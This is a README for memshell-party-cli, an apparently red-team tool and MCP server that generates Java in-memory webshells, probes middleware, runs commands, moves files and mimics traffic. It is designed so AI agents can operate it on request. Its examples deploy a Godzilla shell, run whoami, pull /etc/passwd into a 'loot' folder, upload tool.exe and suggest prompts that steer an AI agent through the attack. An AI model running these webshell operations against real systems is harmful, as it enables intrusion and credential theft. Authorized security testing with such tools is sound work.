# memshell-party-cli

[English](README.en.md) | 中文

A command-line client + MCP server for [MemShellParty](https://party.mem.mk): generate Java memshells, probe targets, verify connections, execute commands, and transfer files. Designed for AI agents (like Claude Code) to operate via natural language, but also fully functional as a standard CLI for manual use.

> ⚠️ For authorized security testing, red teaming, and research only. Do not use on unauthorized targets; use at your own risk.

## Capabilities

| Capability | Description |
|------|------|
| **Memshell Generation** | Supports ~17 middleware/frameworks (Tomcat, Jetty, JBoss, WebLogic, SpringWebMvc, Undertow, Resin, Struts2...), 9 tools (Godzilla, Behinder, AntSword, Command, suo5, NeoreGeorg, Proxy, custom class), multiple mount methods (Listener/Filter/Servlet/Agent), and 60+ packers (Base64, JSP, Deserialization chains, SpEL/OGNL expression injection, AgentJar...). |
| **Blind Probing (`probe`)** | When the middleware is unknown, use DNSLog / Sleep / Echo to probe the server type and JDK version. |
| **Connection Verification (`connect`)** | Verify if the shell is alive and credentials are correct using real protocol handshakes (Godzilla/Behinder/suo5/mimic). |
| **Command Execution (`exec`)** | Execute commands on deployed Godzilla/Behinder shells with automatic Windows/Linux detection. |
| **File Transfer (`upload`/`download`)** | Automatic chunking for large files with integrity verification upon completion (Godzilla via size comparison, Behinder via MD5). |
| **Target Management (`save`/`list`)** | Save shells as "Project/Name," allowing future commands like `memparty exec web1 --cmd whoami` without re-entering long parameters. |
| **Operation Logs (`log`)** | Automatically record operations to a local file (passwords and file contents are excluded). |
| **Traffic Mimicking (`mimic`)** | Create a site profile to make the shell's traffic look like normal pages of the target site. |
| **Interactive Mode** | Enter REPL by typing `memparty`; enter the guided wizard by typing `memparty gen`. |

All generated shells include an authentication header (found in the `gen --json` output), preventing others from using your shell even if they find the URL.

## Two Ways to Use

1. **Via AI (Recommended)** — After installing the accompanying skill/MCP, command the AI in plain language. The AI handles parameter selection, command execution, and error handling.
2. **Via CLI** — A complete CLI where every option has a corresponding parameter, suitable for scripting; `--json` output is available for easy integration.

## Quick Start: Operating via AI

### Step 1: Install the Tool

1. Install [Node.js](https://nodejs.org/) (LTS, v18 or newer).
2. Open your terminal and run:

```bash
npm install -g memshell-party-cli
```

3. Verify installation:

```bash
memparty version
```

If you see a version number, you are good to go.

### Step 2: Teach the Manual to the AI (Skill)

A "Skill" is a comprehensive manual for the AI. Once installed, the AI will follow the manual step-by-step, removing the need for you to be a technical expert.

**For Claude Code users, run:**

```bash
memparty skill install --claude
```

**For other AI agents, run:**

```bash
memparty skill install
```

**To install both:**

```bash
memparty skill install --user --claude
```

**Restart your AI tool** after installation so it can read the new skill. If you update the tool later, run the install command again to refresh the manual.

### Step 3: Connect MCP (Optional, but Recommended)

Allow the AI to call the tool directly. Add this to your AI's MCP configuration:

```json
{
  "mcpServers": {
    "memshell-party": {
      "command": "npx",
      "args": ["-y", "memshell-party-cli", "mcp"]
    }
  }
}
```

Restart the AI after saving.

### Step 4: Talking to the AI

**First, confirm the skill is active (recommended at the start of every new conversation):**

```text
Please read the memshell-party skill first, then operate strictly according to the steps in the skill. Do not guess parameters.
```

**Generate a shell:**

```text
Following the memshell-party skill, please help me generate a common Tomcat Godzilla memshell. 
Give me the file, password, and key, and tell me in simple terms what to do next.
```

**Connect and execute commands:**

```text
Following the memshell-party skill:
URL: [Replace with your address]
Type: Godzilla, Password: [pass], Key: [key].
First, test if it can connect. If it does, execute 'whoami' and tell me the result in simple terms.
```

**Transfer files:**

```text
Following the memshell-party skill.
On the connected shell:
Download [/etc/passwd] from the server to local;
Upload local [tool.exe] to server [/tmp/tool.exe].
```

**"I'm a beginner, guide me":**

```text
I am a beginner. Please read the memshell-party skill first, then guide me step-by-step:
1. Generate a common Tomcat Godzilla memshell.
2. Tell me in plain language which parts of the output I need to save.
3. Once I've deployed it, I'll give you the URL; you help me connect and execute commands.
Explain what to do at each step and wait for my confirmation before proceeding. Operate only in my authorized environment.
```

## Quick Start: Manual CLI Usage

Command Overview:

| Command | Description |
|------|--------|
| `memparty gen` | Generate a memshell (interactive wizard if no parameters) |
| `memparty probe` | Generate a probe shell to test target middleware/JDK blindly |
| `memparty connect` | Verify if the shell is alive and credentials are correct |
| `memparty exec` | Execute commands on the shell |
| `memparty upload` / `download` | Upload/Download files via the shell |
| `memparty save` / `list` / `note` / `remove` | Save and manage targets by name |
| `memparty log` | Check operation logs |
| `memparty config` | Check supported middleware/tools/packers on the backend |
| `memparty profile` / `custom build` / `demo` | Mimic traffic: create site profiles, build custom shells, local demo |
| `memparty skill install` | Install the manual for AI |
| `memparty mcp` | Start the MCP server |
| `memparty parse-classname` | Parse the class name of a .class file |
| `memparty version` | Check CLI and backend versions |

Typical Workflow:

```bash
# 1. Generate a Tomcat Godzilla shell (Listener type, base64 output, auto-decoded to .class)
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class

# 2. Verify after deployment (header value is in 'gen --json' output)
memparty connect -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <token>

# 3. Save as a name to avoid re-typing parameters
memparty save web1 -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <token>

# 4. Execute commands and transfer files
memparty exec web1 --cmd "whoami"
memparty download web1 /etc/passwd -o loot/passwd
```

If you are unsure of valid values, ask the backend (these names are the values to use in parameters):

```bash
memparty config servers          # Which middleware is supported
memparty config tools Tomcat     # Which tools/mount types are supported for this middleware
memparty config packers          # List of packers (choose based on delivery method)
```

Append `--help` to any command for detailed parameters and examples; see the [English README](README.en.md) for full reference.

## Backend: Self-hosting for Real Testing

The default public site `https://party.mem.mk` is for trial use. For real testing, do not send your payloads to a public service—it is highly recommended to self-host via Docker (see MemShellParty's README), then:

```bash
memparty --api http://127.0.0.1:8080 gen
# Or set an environment variable for permanence
export MEMPARTY_API_URL=http://127.0.0.1:8080
```

Priority: `--api` parameter > `MEMPARTY_API_URL` env var > `~/.mempartyrc` config file > Default public site.

## More Documentation

- [mimic Custom Memshell Practical Guide](docs/mimic-memshell-guide.md) — End-to-end traffic mimicking guide (Human-readable)
- [Custom Memshell Design Scheme](docs/custom-memshell-design.md) — Design documentation for mimic
- [README.en.md](README.en.md) — Full English reference (all commands, parameters, MCP tools, API calls)
- [skills/memshell-party/SKILL.md](skills/memshell-party/SKILL.md) — Operation manual for AI (humans can also read for deep details)

## Development

```bash
npm install
npm run build       # tsup -> dist/
npm test            # vitest
npm run typecheck   # tsc --noEmit
```

## License

MIT
